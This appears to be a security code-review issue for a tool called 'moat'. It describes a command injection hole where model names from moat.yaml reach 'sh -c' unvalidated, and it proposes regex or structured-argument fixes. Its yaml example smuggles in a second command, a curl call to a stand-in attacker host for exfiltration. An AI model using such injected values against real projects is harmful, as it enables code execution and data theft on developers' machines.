---
status: pending
priority: p1
issue_id: "001"
tags: [code-review, security]
dependencies: []
---

# Command Injection via Provision Item Names

## Problem Statement

User-supplied model names from `moat.yaml` are interpolated directly into a shell command template via `strings.ReplaceAll(cmdTemplate, "{item}", item)` and executed via `sh -c` inside the service container. There is zero validation or sanitization of the model name strings.

A `moat.yaml` like:
```yaml
services:
  ollama:
    models:
      - "qwen2.5-coder:7b; curl http://attacker.com/exfil"
```
produces `ollama pull qwen2.5-coder:7b; curl http://attacker.com/exfil` passed to `sh -c`.

While `moat.yaml` is user-authored (so the threat model is "user trusts their own config"), a malicious repository with a checked-in `moat.yaml` could exploit developers who clone and `moat run`. Combined with the host-writable cache mount, this allows writing arbitrary files to `~/.moat/cache/ollama/` on the host.

## Findings

- **Source**: Security Sentinel, Architecture Strategist
- **Location**: `internal/run/services.go:225-233` (`buildProvisionCmds`), executed in `docker_service.go:89` and `apple_service.go:97`
- **Existing pattern**: `ExtraCmd` also uses placeholder substitution, but those values come from the compiled-in registry, not user config

## Proposed Solutions

### Option A: Validate provision items against a strict regex
- Validate model names match `^[a-zA-Z0-9][a-zA-Z0-9._/-]*(:[a-zA-Z0-9._-]+)?$` before interpolation
- **Pros**: Simple, minimal code change, catches injection attempts
- **Cons**: Regex must be maintained as Ollama's naming conventions evolve; other future services may have different valid characters
- **Effort**: Small
- **Risk**: Low

### Option B: Avoid `sh -c` entirely for provisioning
- Restructure `ProvisionCmd` from a shell template string into a structured command with separate args (e.g., `["ollama", "pull", "{item}"]`)
- **Pros**: Eliminates shell injection entirely at the design level
- **Cons**: Requires registry format change, more invasive, breaks the simple `provision_cmd` string pattern
- **Effort**: Medium
- **Risk**: Medium (interface change)

### Option C: Generic item validation at the framework level
- Add an optional `provision_item_pattern` field to `ServiceDef` (e.g., `^[a-zA-Z0-9._/:@-]+$`), validate items against it in `buildServiceConfig`
- **Pros**: Each service defines its own valid item pattern; no hardcoded Ollama knowledge
- **Cons**: Slightly more complex registry format
- **Effort**: Small-Medium
- **Risk**: Low

## Recommended Action

Option A for the immediate fix (quickest to unblock), consider Option C as a follow-up for the generic pattern.

## Technical Details

- **Affected files**: `internal/run/services.go`, `internal/deps/types.go` (if adding validation pattern)
- **Components**: Service provisioning pipeline

## Acceptance Criteria

- [ ] Provision items containing shell metacharacters (`;`, `|`, `$`, `` ` ``, `&`) are rejected with a clear error
- [ ] Valid Ollama model names (e.g., `qwen2.5-coder:7b`, `nomic-embed-text`, `library/model:tag`) pass validation
- [ ] Unit test covers injection attempt

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2026-03-17 | Created from code review | Security + Architecture agents both flagged this |

## Resources

- Ollama model naming: `[namespace/]model[:tag]`
- Existing `ExtraCmd` pattern uses registry-defined (not user-defined) values
